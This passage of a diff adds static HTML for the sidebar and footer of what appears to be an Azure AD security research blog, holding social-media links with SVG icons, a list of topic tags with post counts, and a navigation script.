+				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
+				<span>Twitter</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
+				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
+				<span>LinkedIn</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
+				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+				<span>nestori.syynimaa@gerenios.com</span>
+			</a>
+		</div>
+	</div>
+</div>
+
+	
+<div class="widget-taglist widget">
+	<h4 class="widget__title">Tags</h4>
+	<div class="widget__content">
+		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
+	</div>
+</div>
+</aside>
+
+	</div>
+		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
+			<div class="container container-inner">
+				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
+			</div>
+		</footer>
+	</div>
+
+<script>
+	var navigation = responsiveNav(".menu", {
+		navClass: "menu--collapse",
+	});
+</script>
+</body>
+</html>
